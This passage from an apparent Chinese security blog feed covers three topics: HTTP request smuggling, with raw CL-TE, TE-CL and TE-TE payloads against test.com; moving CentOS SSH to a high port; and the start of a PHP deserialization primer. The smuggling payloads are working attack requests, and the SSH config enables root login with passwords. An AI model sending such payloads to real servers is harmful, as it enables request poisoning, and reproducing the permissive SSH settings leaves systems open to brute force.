json">[chunk size][\r\n][chunk data][\r\n][chunk size][\r\n][chunk data][\r\n][chunk size = <span class="hljs-number">0</span>][\r\n][\r\n]<br></code></pre></td></tr></table></figure><p><strong>chunked编码</strong><br> 参考：<a href="https://blog.csdn.net/yankai0219/article/details/8269922">http协议中content-length 以及chunked编码分析</a><br> <strong>构造请求示例</strong>：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">POST / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: test.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>......<br>Connection: keep-alive<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Content-Length: 6<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Transfer-Encoding: chunked<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>a<br></code></pre></td></tr></table></figure><p>连续发送几次请求就可以获得响应。<br> <strong>攻击流程</strong>：<br> 由于前端服务器处理<code>Content-Length</code>，所以这个请求对于它来说是一个完整的请求，请求体的长度为6，也就是</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>a<br></code></pre></td></tr></table></figure><p>当请求包经过代理服务器转发给后端服务器时，后端服务器处理<code>Transfer-Encoding</code>，当它读取到</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br></code></pre></td></tr></table></figure><p>认为已经读取到结尾了。<br> 但剩下的字母<code>a</code>就被留在了缓冲区中，等待下一次请求。当我们重复发送请求后，发送的请求在后端服务器拼接成了类似下面这种请求：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">aPOST / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: test.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>......<br></code></pre></td></tr></table></figure><p>服务器在解析时就会产生报错了，从而造成HTTP请求走私。</p><h4 id="TE-CL"><a href="#TE-CL" class="headerlink" title="TE-CL"></a>TE-CL</h4><p>TE-CL，就是当收到存在两个请求头的请求包时，前端代理服务器处理<code>Transfer-Encoding</code>请求头，后端服务器处理<code>Content-Length</code>请求头。<br> <strong>构造请求示例</strong>：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">POST / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: test.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>......<br>Content-Length: 4<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Transfer-Encoding: chunked<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>12<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>aPOST / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br></code></pre></td></tr></table></figure><p><strong>攻击流程</strong>：<br> 前端服务器处理<code>Transfer-Encoding</code>，当其读取到</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br></code></pre></td></tr></table></figure><p>认为是读取完毕了。<br> 此时这个请求对代理服务器来说是一个完整的请求，然后转发给后端服务器，后端服务器处理<code>Content-Length</code>请求头，因为请求体的长度为<code>4</code>.也就是当它读取完</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">12<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br></code></pre></td></tr></table></figure><p>就认为这个请求已经结束了。后面的数据就认为是另一个请求：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">aPOST / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br></code></pre></td></tr></table></figure><p>成功报错，造成HTTP请求走私。</p><h4 id="TE-TE"><a href="#TE-TE" class="headerlink" title="TE-TE"></a>TE-TE</h4><p>TE-TE，当收到存在两个请求头的请求包时，前后端服务器都处理<code>Transfer-Encoding</code>请求头，确实是实现了RFC的标准。不过前后端服务器不是同一种。这就有了一种方法，我们可以对发送的请求包中的<code>Transfer-Encoding</code>进行某种混淆操作(如某个字符改变大小写)，从而使其中一个服务器不处理<code>Transfer-Encoding</code>请求头。在某种意义上这还是<code>CL-TE</code>或者<code>TE-CL</code>。<br> <strong>构造请求示例</strong>：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">POST / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: test.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>......<br>Content-length: 4<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Transfer-Encoding: chunked<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Transfer-encoding: cow<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>5c<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>aPOST / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Content-Type: application/x-www-form-urlencoded<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Content-Length: 15<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>x=1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br></code></pre></td></tr></table></figure><p><strong>攻击流程</strong>：<br> 前端服务器处理<code>Transfer-Encoding</code>，当其读取到</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br></code></pre></td></tr></table></figure><p>认为是读取结束。<br> 此时这个请求对代理服务器来说是一个完整的请求，然后转发给后端服务器处理<code>Transfer-encoding</code>请求头，将<code>Transfer-Encoding</code>隐藏在服务端的一个<code>chain</code>中时，它将会回退到使用<code>Content-Length</code>去发送请求。读取到</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">5c<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br></code></pre></td></tr></table></figure><p>认为是读取完毕了。后面的数据就认为是另一个请求：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">aPOST / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Content-Type: application/x-www-form-urlencoded<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Content-Length: 15<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>x=1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br></code></pre></td></tr></table></figure><p>成功报错，造成HTTP请求走私。</p>]]></content>
    
    
    <categories>
      
      <category>cs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>knowledge</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用高端口ssh</title>
    <link href="/2021/06/03/%E4%BD%BF%E7%94%A8%E9%AB%98%E7%AB%AF%E5%8F%A3ssh/"/>
    <url>/2021/06/03/%E4%BD%BF%E7%94%A8%E9%AB%98%E7%AB%AF%E5%8F%A3ssh/</url>
    
    <content type="html"><![CDATA[<h1 id="Centos7使用ssh连接之改端口22"><a href="#Centos7使用ssh连接之改端口22" class="headerlink" title="Centos7使用ssh连接之改端口22"></a>Centos7使用ssh连接之改端口22</h1><p><strong>题记：</strong></p><p>说来贻笑大方，开始接触ssh时认为22端口作为ssh常用端口，放到公网上容易被别人爆破，谁让我用的是弱密码呢，我错了，但我下次还敢哈哈哈，其实有没有改端口，使用弱密码映射到公网是极不安全的，对方只要扫一扫你开放的端口，简单的爆破一下你就完蛋</p><p><strong>正题</strong></p><h2 id="一、更改sshd配置文件"><a href="#一、更改sshd配置文件" class="headerlink" title="一、更改sshd配置文件"></a>一、更改sshd配置文件</h2><p>ssh_config是客服端的配置文件，而centos7作为受，啊哈，即服务端，等待连接的，修改sshd_config</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><code class="hljs vala"><span class="hljs-meta">#       $OpenBSD: sshd_config,v 1.100 2016/08/15 12:32:04 naddy Exp $</span><br><br><span class="hljs-meta"># This is the sshd server system-wide configuration file.  See</span><br><span class="hljs-meta"># sshd_config(5) for more information.</span><br><br><span class="hljs-meta"># This sshd was compiled with PATH=/usr/local/bin:/usr/bin</span><br><br><span class="hljs-meta"># The strategy used for options in the default sshd_config shipped with</span><br><span class="hljs-meta"># OpenSSH is to specify options with their default value where</span><br><span class="hljs-meta"># possible, but leave them commented.  Uncommented options override the</span><br><span class="hljs-meta"># default value.</span><br><br><span class="hljs-meta"># If you want to change the port on a SELinux system, you have to tell</span><br><span class="hljs-meta"># SELinux about this change.</span><br><span class="hljs-meta"># semanage port -a -t ssh_port_t -p tcp #PORTNUMBER</span><br><span class="hljs-meta">#</span><br><span class="hljs-meta">#Port 22</span><br>⭐Port <span class="hljs-number">23333</span><br><span class="hljs-meta">#AddressFamily any</span><br>⭐ListenAddress <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><br>⭐ListenAddress ::<br><br>HostKey /etc/ssh/ssh_host_rsa_key<br><span class="hljs-meta">#HostKey /etc/ssh/ssh_host_dsa_key</span><br>HostKey /etc/ssh/ssh_host_ecdsa_key<br>HostKey /etc/ssh/ssh_host_ed25519_key<br><br><span class="hljs-meta"># Ciphers and keying</span><br><span class="hljs-meta">#RekeyLimit default none</span><br><br><span class="hljs-meta"># Logging</span><br><span class="hljs-meta">#SyslogFacility AUTH</span><br>SyslogFacility AUTHPRIV<br><span class="hljs-meta">#LogLevel INFO</span><br><br><span class="hljs-meta"># Authentication:</span><br><br><span class="hljs-meta">#LoginGraceTime 2m</span><br>⭐PermitRootLogin yes<br><span class="hljs-meta">#StrictModes yes</span><br><span class="hljs-meta">#MaxAuthTries 6</span><br><span class="hljs-meta">#MaxSessions 10</span><br><br><span class="hljs-meta">#PubkeyAuthentication yes</span><br><br><span class="hljs-meta"># The default is to check both .ssh/authorized_keys and .ssh/authorized_keys2</span><br><span class="hljs-meta"># but this is overridden so installations will only check .ssh/authorized_keys</span><br>AuthorizedKeysFile      .ssh/authorized_keys<br><br><span class="hljs-meta">#AuthorizedPrincipalsFile none</span><br><br><span class="hljs-meta">#AuthorizedKeysCommand none</span><br><span class="hljs-meta">#AuthorizedKeysCommandUser nobody</span><br><br><span class="hljs-meta"># For this to work you will also need host keys in /etc/ssh/ssh_known_hosts</span><br><span class="hljs-meta">#HostbasedAuthentication no</span><br><span class="hljs-meta"># Change to yes if you don&#x27;t trust ~/.ssh/known_hosts for</span><br><span class="hljs-meta"># HostbasedAuthentication</span><br><span class="hljs-meta">#IgnoreUserKnownHosts no</span><br><span class="hljs-meta"># Don&#x27;t read the user&#x27;s ~/.rhosts and ~/.shosts files</span><br><span class="hljs-meta">#IgnoreRhosts yes</span><br><br><span class="hljs-meta"># To disable tunneled clear text passwords, change to no here!</span><br><span class="hljs-meta">#PasswordAuthentication yes</span><br><span class="hljs-meta">#PermitEmptyPasswords no</span><br>⭐PasswordAuthentication yes<br><br><span class="hljs-meta"># Change to no to disable s/key passwords</span><br><span class="hljs-meta">#ChallengeResponseAuthentication yes</span><br>ChallengeResponseAuthentication no<br><br><span class="hljs-meta"># Kerberos options</span><br><span class="hljs-meta">#KerberosAuthentication no</span><br><span class="hljs-meta">#KerberosOrLocalPasswd yes</span><br><span class="hljs-meta">#KerberosTicketCleanup yes</span><br><span class="hljs-meta">#KerberosGetAFSToken no</span><br><span class="hljs-meta">#KerberosUseKuserok yes</span><br><br><span class="hljs-meta"># GSSAPI options</span><br>GSSAPIAuthentication yes<br>GSSAPICleanupCredentials no<br><span class="hljs-meta">#GSSAPIStrictAcceptorCheck yes</span><br><span class="hljs-meta">#GSSAPIKeyExchange no</span><br><span class="hljs-meta">#GSSAPIEnablek5users no</span><br><br><span class="hljs-meta"># Set this to &#x27;yes&#x27; to enable PAM authentication, account processing,</span><br><span class="hljs-meta"># and session processing. If this is enabled, PAM authentication will</span><br><span class="hljs-meta"># be allowed through the ChallengeResponseAuthentication and</span><br><span class="hljs-meta"># PasswordAuthentication.  Depending on your PAM configuration,</span><br><span class="hljs-meta"># PAM authentication via ChallengeResponseAuthentication may bypass</span><br><span class="hljs-meta"># the setting of &quot;PermitRootLogin without-password&quot;.</span><br><span class="hljs-meta"># If you just want the PAM account and session checks to run without</span><br><span class="hljs-meta"># PAM authentication, then enable this but set PasswordAuthentication</span><br><span class="hljs-meta"># and ChallengeResponseAuthentication to &#x27;no&#x27;.</span><br><span class="hljs-meta"># WARNING: &#x27;UsePAM no&#x27; is not supported in Red Hat Enterprise Linux and may cause several</span><br><span class="hljs-meta"># problems.</span><br>UsePAM yes<br><br><span class="hljs-meta">#AllowAgentForwarding yes</span><br><span class="hljs-meta">#AllowTcpForwarding yes</span><br><span class="hljs-meta">#GatewayPorts no</span><br>X11Forwarding yes<br><span class="hljs-meta">#X11DisplayOffset 10</span><br><span class="hljs-meta">#X11UseLocalhost yes</span><br><span class="hljs-meta">#PermitTTY yes</span><br><span class="hljs-meta">#PrintMotd yes</span><br><span class="hljs-meta">#PrintLastLog yes</span><br><span class="hljs-meta">#TCPKeepAlive yes</span><br><span class="hljs-meta">#UseLogin no</span><br><span class="hljs-meta">#UsePrivilegeSeparation sandbox</span><br><span class="hljs-meta">#PermitUserEnvironment no</span><br><span class="hljs-meta">#Compression delayed</span><br><span class="hljs-meta">#ClientAliveInterval 0</span><br><span class="hljs-meta">#ClientAliveCountMax 3</span><br><span class="hljs-meta">#ShowPatchLevel no</span><br><span class="hljs-meta">#UseDNS yes</span><br><span class="hljs-meta">#PidFile /var/run/sshd.pid</span><br><span class="hljs-meta">#MaxStartups 10:30:100</span><br><span class="hljs-meta">#PermitTunnel no</span><br><span class="hljs-meta">#ChrootDirectory none</span><br><span class="hljs-meta">#VersionAddendum none</span><br><br><span class="hljs-meta"># no default banner path</span><br><span class="hljs-meta">#Banner none</span><br><br><span class="hljs-meta"># Accept locale-related environment variables</span><br>AcceptEnv LANG LC_CTYPE LC_NUMERIC LC_TIME LC_COLLATE LC_MONETARY LC_MESSAGES<br>AcceptEnv LC_PAPER LC_NAME LC_ADDRESS LC_TELEPHONE LC_MEASUREMENT<br>AcceptEnv LC_IDENTIFICATION LC_ALL LANGUAGE<br>AcceptEnv XMODIFIERS<br><br><span class="hljs-meta"># override default of no subsystems</span><br>Subsystem       sftp    /usr/libexec/openssh/sftp-server<br><br><span class="hljs-meta"># Example of overriding settings on a per-user basis</span><br><span class="hljs-meta">#Match User anoncvs</span><br><span class="hljs-meta">#       X11Forwarding no</span><br><span class="hljs-meta">#       AllowTcpForwarding no</span><br><span class="hljs-meta">#       PermitTTY no</span><br><span class="hljs-meta">#       ForceCommand cvs server</span><br></code></pre></td></tr></table></figure><p>每一次更改配置文件都要重启服务才能生效</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vala"><span class="hljs-meta">#重启systemctl restart sshd</span><br><span class="hljs-meta">#查看systemctl status sshd</span><br><span class="hljs-meta">#停止systemctl stop sshd</span><br></code></pre></td></tr></table></figure><p>其他方法查看</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vala"><span class="hljs-meta">#进程ps -e|grep sshd</span><br><span class="hljs-meta">#网络状态netstat -an|grep 22888</span><br></code></pre></td></tr></table></figure><p>你以为这就结束了，nonono，还有两层层膜没有捅破</p><h2 id="二、开放端口"><a href="#二、开放端口" class="headerlink" title="二、开放端口"></a>二、开放端口</h2><h3 id="SELinux"><a href="#SELinux" class="headerlink" title="SELinux"></a>SELinux</h3><p>如果你关闭了这个安全系统，直接跳至firewall-cmd</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">semanage port -l|<span class="hljs-keyword">grep</span> ssh<span class="hljs-comment">#打印SELinux开放ssh的情况</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/2021/06/03/.png"></p><p>好吧 它只开放了22</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">semanage</span> port -a -t ssh_port_t -p tcp <span class="hljs-number">23333</span>#添加端口<span class="hljs-number">23333</span><br></code></pre></td></tr></table></figure><p>再次打印，已经添加完毕</p><h3 id="firewall-cmd"><a href="#firewall-cmd" class="headerlink" title="firewall-cmd"></a>firewall-cmd</h3><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">firewall-cmd <span class="hljs-params">--permanent</span> <span class="hljs-params">--query-port=23333/tcp</span><span class="hljs-comment">#打印防火墙是否开放了tcp的23333端口</span><br></code></pre></td></tr></table></figure><p>肯定没有</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">firewall-cmd <span class="hljs-params">--permanent</span> <span class="hljs-params">--add-port=23333/tcp</span><span class="hljs-comment">#添加防火墙规则</span><br></code></pre></td></tr></table></figure><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">firewall-<span class="hljs-keyword">cmd</span><span class="bash"> --reload<span class="hljs-comment">#重载防火墙策略</span></span><br></code></pre></td></tr></table></figure><p>你登录吧😂</p>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>通信隧道</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>反序列化漏洞</title>
    <link href="/2021/05/29/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <url>/2021/05/29/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><h2 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h2><p>类中，实例化生成一个对象，而把这个对象转化成字符串，这个操作就是序列化。反过来，将字符串转化成类模板形式的对象，就是反序列化。两者结合就可以方便地存储和传输数据。</p><p>不同编程语言序列化后的存储文件不同，当然语法也不相同</p><p>我们以php语言为例</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210529193530927.png"></p><table><thead><tr><th align="center">函数</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">serialize()</td><td align="center">将一个对象转换成一串字符串</td></tr><tr><td align="center">unserialize()</td><td align="center">将一串字符串转换成一个对象</td></tr></tbody></table><h2 id="PHP序列化的格式"><a href="#PHP序列化的格式" class="headerlink" title="PHP序列化的格式"></a>PHP序列化的格式</h2><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs smali">a -<span class="hljs-built_in"> array</span><br><span class="hljs-built_in"></span>b - boolean<br>d -<span class="hljs-built_in"> double</span><br><span class="hljs-built_in"></span>i - integer<br>o - common object<br>r - reference<br>s - string<br>C - custom object<br>O - class//最常用的复合类型<br>N - null<br>R - pointer reference<br>U - unicode string<br></code></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;?php<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    public $a = <span class="hljs-string">&#x27;ThisA&#x27;</span>;<br>    protected $b = <span class="hljs-string">&#x27;ThisB&#x27;</span>;<br>    private $c = <span class="hljs-string">&#x27;ThisC&#x27;</span>;<br>    public <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;this is a test!&#x27;</span>;<br>    &#125;<br>&#125;<br>$test = <span class="hljs-keyword">new</span> Test();<br>var_dump(serialize($test));<br>echo <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>var_dump(unserialize(serialize($test)))<br>?&gt;<br></code></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight zephir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs zephir"><span class="hljs-keyword">string</span>(<span class="hljs-number">84</span>) <span class="hljs-string">&quot;O:4:&quot;</span>Test<span class="hljs-string">&quot;:3:&#123;s:1:&quot;</span>a<span class="hljs-string">&quot;;s:5:&quot;</span>ThisA<span class="hljs-string">&quot;;s:4:&quot;</span>*b<span class="hljs-string">&quot;;s:5:&quot;</span>ThisB<span class="hljs-string">&quot;;s:7:&quot;</span>Testc<span class="hljs-string">&quot;;s:5:&quot;</span>ThisC<span class="hljs-string">&quot;;&#125;&quot;</span><br><br><span class="hljs-keyword">object</span>(Test)#<span class="hljs-number">2</span> (<span class="hljs-number">3</span>) &#123; [<span class="hljs-string">&quot;a&quot;</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;ThisA&quot;</span> [<span class="hljs-string">&quot;b&quot;</span>:<span class="hljs-keyword">protected</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;ThisB&quot;</span> [<span class="hljs-string">&quot;c&quot;</span>:<span class="hljs-string">&quot;Test&quot;</span>:<span class="hljs-keyword">private</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;ThisC&quot;</span> &#125; <br></code></pre></td></tr></table></figure><h4 id="public-protected-private在序列化时的区别"><a href="#public-protected-private在序列化时的区别" class="headerlink" title="public/protected/private在序列化时的区别"></a>public/protected/private在序列化时的区别</h4><p>这个类的三个成员变量由于变量前的修饰不同，在序列化出来后显示的也不同。</p><p><code>s:1:&quot;a&quot;;s:5:&quot;ThisA&quot;;</code> ：以 <code>;</code>分开变量名和变量值，变量名为1个字符的a，变量值为”ThisA”</p><p><code>s:4:&quot;*b&quot;;s:5:&quot;ThisA&quot;;</code>：多了 <code>*</code>，用以区分 protected 修饰符，另外实际页面中会出现乱码，实际上 protected属性的表示方式是在变量名前加个<code>%00*%00</code></p><p><code>s:7:&quot;Testc&quot;;s:5:&quot;ThisC&quot;;</code>： 